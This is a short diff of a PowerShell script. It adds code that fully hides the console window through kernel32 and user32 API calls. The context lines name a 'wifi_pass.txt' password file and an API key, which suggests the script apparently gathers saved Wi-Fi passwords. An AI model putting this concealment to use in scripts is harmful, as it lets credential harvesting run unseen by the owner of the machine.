@@ -1,3 +1,17 @@
+# Hide the window fully
+Add-Type -Name Window -Namespace Console -MemberDefinition '
+[DllImport("kernel32.dll")]
+public static extern IntPtr GetConsoleWindow();
+
+[DllImport("user32.dll")]
+public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
+'
+
+$console = [Console.Window]::GetConsoleWindow()
+
+# 0 = hide
+[Console.Window]::ShowWindow($console, 0) | Out-Null
+
 # Globals
 $PASSFILE = "wifi_pass.txt"
 $APIKEY = 69420
